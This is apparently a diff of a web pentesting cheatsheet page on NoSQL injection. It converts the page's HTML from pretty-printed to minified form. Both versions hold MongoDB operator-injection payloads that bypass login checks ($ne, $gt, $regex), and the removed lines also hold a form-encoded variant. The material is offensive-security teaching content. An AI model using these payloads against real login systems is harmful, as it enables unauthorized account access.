@@ -1,589 +1,106 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>NoSQL Injection | JinPwn</title><meta name="description" content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/">
-<meta property="og:title" content="NoSQL Injection | JinPwn">
-<meta property="og:description" content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="NoSQL Injection | JinPwn">
-<meta name="twitter:description" content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"NoSQL Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link is-current">NoSQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>NoSQL Injection</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">NoSQL Injection</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Web Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link is-current">NoSQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
-</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
-    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Most common in Node.js / Python apps using MongoDB. Look for:</p>
-<ul>
-<li>Login forms with JSON body (MongoDB find with raw user input)</li>
-<li>Search endpoints that accept structured queries</li>
-<li>API endpoints with JSON parameters (<code>/api/users?filter={...}</code>)</li>
-<li>Redis-backed sessions / cache (rare to inject, but possible)</li>
-<li>Elasticsearch query strings</li>
-<li>CouchDB Mango queries</li>
-</ul>
-<p>Signal that suggests NoSQL behind the scenes:</p>
-<ul>
-<li>Server fingerprints as Node.js / Express / Python+Flask/FastAPI</li>
-<li>API returns JSON-shaped data with <code>_id</code> fields</li>
-<li>ObjectId pattern (24-char hex) in URLs or responses</li>
-<li>Error messages mentioning <code>BSON</code>, <code>Mongo</code>, <code>Cursor</code>, <code>find()</code></li>
-</ul>
-<h2 id="ii-mongodb-operator-injection" data-heading-permalink="true"><span class="heading-content">ii. MongoDB operator injection</span>
-    <a class="heading-permalink" href="#ii-mongodb-operator-injection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="auth-bypass-via-operator-injection" data-heading-permalink="true"><span class="heading-content">Auth bypass via operator injection</span>
-    <a class="heading-permalink" href="#auth-bypass-via-operator-injection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Login endpoint expects:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;pass&#34;</span><span class="p">}</span>
-</span></span></code></pre></div><p>Many apps query the DB with <code>db.users.find({username: req.body.username, password: req.body.password})</code>. If the server doesn&rsquo;t validate types, you inject query operators:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">}}</span>
-</span></span></code></pre></div><p><code>$ne</code> (not equal) means &ldquo;password is anything except &lsquo;x&rsquo;&rdquo;. Returns the admin row.</p>
-<p>Common operators for auth bypass:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">},</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$gt&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">},</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$gt&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">}}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span> <span class="s2">&#34;^adm&#34;</span><span class="p">},</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span> <span class="s2">&#34;.*&#34;</span><span class="p">}}</span>
-</span></span></code></pre></div><h3 id="url-encoded-form-variant" data-heading-permalink="true"><span class="heading-content">URL-encoded form variant</span>
-    <a class="heading-permalink" href="#url-encoded-form-variant" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When the endpoint accepts form-encoded data, PHP/Express parse <code>key[$ne]=x</code> as <code>{key: {$ne: 'x'}}</code>:</p>
-<pre tabindex="0"><code>POST /login
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>NoSQL Injection | JinPwn</title><meta name=description content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/><meta property="og:title" content="NoSQL Injection | JinPwn"><meta property="og:description" content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="NoSQL Injection | JinPwn"><meta name=twitter:description content="MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"NoSQL Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Web Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/web/ class=cheatsheet-sidebar-section>Web Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-sidebar-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-sidebar-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-sidebar-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-sidebar-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class="cheatsheet-sidebar-link is-current">NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-sidebar-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-sidebar-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-sidebar-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-sidebar-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-sidebar-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-sidebar-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-sidebar-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-sidebar-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-sidebar-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-sidebar-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-sidebar-link>WEB15 Prototype Pollution</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>NoSQL Injection</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>NoSQL Injection</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Web Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/web/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-mobile-sections-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-mobile-sections-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-mobile-sections-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-mobile-sections-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class="cheatsheet-mobile-sections-link is-current">NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-mobile-sections-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-mobile-sections-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-mobile-sections-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-mobile-sections-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-mobile-sections-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-mobile-sections-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-mobile-sections-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-mobile-sections-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-mobile-sections-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-mobile-sections-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-mobile-sections-link>WEB15 Prototype Pollution</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>T</span><span class=o>=</span>https://target.com
+</span></span></code></pre></div><h2 id=i-where-it-lives data-heading-permalink=true><span class=heading-content>i. Where it lives</span>
+<a class=heading-permalink href=#i-where-it-lives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Most common in Node.js / Python apps using MongoDB. Look for:</p><ul><li>Login forms with JSON body (MongoDB find with raw user input)</li><li>Search endpoints that accept structured queries</li><li>API endpoints with JSON parameters (<code>/api/users?filter={...}</code>)</li><li>Redis-backed sessions / cache (rare to inject, but possible)</li><li>Elasticsearch query strings</li><li>CouchDB Mango queries</li></ul><p>Signal that suggests NoSQL behind the scenes:</p><ul><li>Server fingerprints as Node.js / Express / Python+Flask/FastAPI</li><li>API returns JSON-shaped data with <code>_id</code> fields</li><li>ObjectId pattern (24-char hex) in URLs or responses</li><li>Error messages mentioning <code>BSON</code>, <code>Mongo</code>, <code>Cursor</code>, <code>find()</code></li></ul><h2 id=ii-mongodb-operator-injection data-heading-permalink=true><span class=heading-content>ii. MongoDB operator injection</span>
+<a class=heading-permalink href=#ii-mongodb-operator-injection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=auth-bypass-via-operator-injection data-heading-permalink=true><span class=heading-content>Auth bypass via operator injection</span>
+<a class=heading-permalink href=#auth-bypass-via-operator-injection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Login endpoint expects:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;pass&#34;</span><span class=p>}</span>
+</span></span></code></pre></div><p>Many apps query the DB with <code>db.users.find({username: req.body.username, password: req.body.password})</code>. If the server doesn&rsquo;t validate types, you inject query operators:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span> <span class=s2>&#34;x&#34;</span><span class=p>}}</span>
+</span></span></code></pre></div><p><code>$ne</code> (not equal) means &ldquo;password is anything except &lsquo;x&rsquo;&rdquo;. Returns the admin row.</p><p>Common operators for auth bypass:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>},</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>}}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$gt&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>},</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$gt&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>}}</span>
